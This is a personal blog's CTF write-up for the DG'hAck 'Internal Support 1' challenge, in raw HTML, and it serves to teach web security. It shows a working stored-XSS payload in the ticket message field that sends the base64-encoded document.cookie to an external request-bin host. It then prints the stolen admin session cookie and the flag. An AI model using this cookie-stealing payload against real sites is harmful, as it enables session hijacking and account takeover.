<!doctype html><html lang=en-us><head><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link rel=stylesheet href=/css/main.min.3c9fa6b3264a9f8be4f27730f1d5f0ded496304d03812ed49d97703ffb28122a.css integrity="sha256-PJ+msyZKn4vk8ncw8dXw3tSWME0DgS7UnZdwP/soEio=" crossorigin=anonymous media=screen><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Didact+Gothic"><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=HandheldFriendly content="True"><meta name=MobileOptimized content="320"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><title>Writeup DG&rsquo;hAck: Internal Support 1 - Nicolas Bourras</title><meta name=twitter:card content="summary"><meta name=twitter:title content="Writeup DG'hAck: Internal Support 1"><meta name=twitter:description content="The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :

Trying a classic xss (<script>alert(1)</script>) in the message field seems to work. We know that we have to login as an admin user, so let&rsquo;s try stealing the cookies :
<svg onload=&#34;document.body.innerHTML=document.body.innerHTML.concat('<img src=\'https://eni7j9jobszxl.x.pipedream.net/'.concat(btoa(document.cookie)).concat('\' />'))&#34; /> After a few seconds, we get a request on our request bin, which when decoded gives us the admin cookie :"><meta property="og:title" content="Writeup DG'hAck: Internal Support 1"><meta property="og:description" content="The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :

Trying a classic xss (<script>alert(1)</script>) in the message field seems to work. We know that we have to login as an admin user, so let&rsquo;s try stealing the cookies :
<svg onload=&#34;document.body.innerHTML=document.body.innerHTML.concat('<img src=\'https://eni7j9jobszxl.x.pipedream.net/'.concat(btoa(document.cookie)).concat('\' />'))&#34; /> After a few seconds, we get a request on our request bin, which when decoded gives us the admin cookie :"><meta property="og:type" content="article"><meta property="og:url" content="https://nicolasb.fr/blog/writeup-dghack-internal-support-1/"><meta property="article:published_time" content="2020-11-19T03:19:55+01:00"><meta property="article:modified_time" content="2020-11-19T03:19:55+01:00"><title>Writeup DG&rsquo;hAck: Internal Support 1</title></head><body><header class="wrap flex-container"><h1>Writeup DG&rsquo;hAck: Internal Support 1</h1></header><main class=wrap><div class=flex-container><aside role=complementary>Nov 19, 2020 &#183; 97 words<div class=tag-container><span class=tag><a href=/tags/blog/>blog</a></span>
<span class=tag><a href=/tags/security/>security</a></span>
<span class=tag><a href=/tags/ctf/>ctf</a></span>
<span class=tag><a href=/tags/dghack/>dghack</a></span></div></aside><hr><article role=article><p>The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :</p><p><a href=/assets/dghack/internal-support-1.png><img src=/assets/dghack/internal-support-1.png alt="The ticketing system"></a></p><p>Trying a classic xss (<code>&lt;script>alert(1)&lt;/script></code>) in the message field seems to work. We know that we have to login as an admin user, so let&rsquo;s try stealing the cookies :</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>svg</span> <span style=color:#a6e22e>onload</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;document.body.innerHTML=document.body.innerHTML.concat(&#39;&lt;img src=\&#39;https://eni7j9jobszxl.x.pipedream.net/&#39;.concat(btoa(document.cookie)).concat(&#39;\&#39; /&gt;&#39;))&#34;</span> /&gt;
</code></pre></div><p>After a few seconds, we get a request on our <a href=https://requestbin.com/>request bin</a>, which when decoded gives us the admin cookie :</p><pre><code>session=.eJwlTstqwzAQ_BWhcyh67UryV_RegllJu7GpGxfLOYX8exV6GubBzDz1LBv1hbuevp5anQP0D_dON9YX_bkxdVbbflPrXZ27olqHqc5l7ep3ZD709XW9jJKD-6Kn83jwYGvTk84VfCkhQ7NoI7GLVhJF8hhNDcEEtFnQCOWYoIENURoKtoQ1coiGjA8sAi65VFMBahElo1gStozZZxYKxgGERpliDNYTChQoBkuDcX9-dD7-39hBaz9kPvdvvg-hgpTkjBPyb_RUGZhqhOxbDqW9h5EI9OsP9hJWpw.X7XZVw.vQUecnJN2gaDUDDYuPeB5LNZbbg
</code></pre><p>Logging in using that cookie reveals this todo-list :</p><p><a href=/assets/dghack/internal-support-1-todo.png><img src=/assets/dghack/internal-support-1-todo.png alt="The admin&rsquo;s todo list"></a></p><p>Which contains the flag: <code>NoUserValidationIsADangerousPractice</code>.</p><hr><p><a href=/tags/dghack>View all of the DG&rsquo;hAck articles</a>.</p></article></div><nav role=navigation class="flex-container bottom-menu"><hr><p><a href=/blog>back</a>
&#183;
<a href=/blog>blog</a>
&#183;
<a href=/recipes>recipes</a>
&#183;
<a href=/about>who am I?</a>
&#183;
<a href=/>home</a></p></nav></main><footer class="flex-container footer">Nicolas Bourras&rsquo;s site</footer></body></html>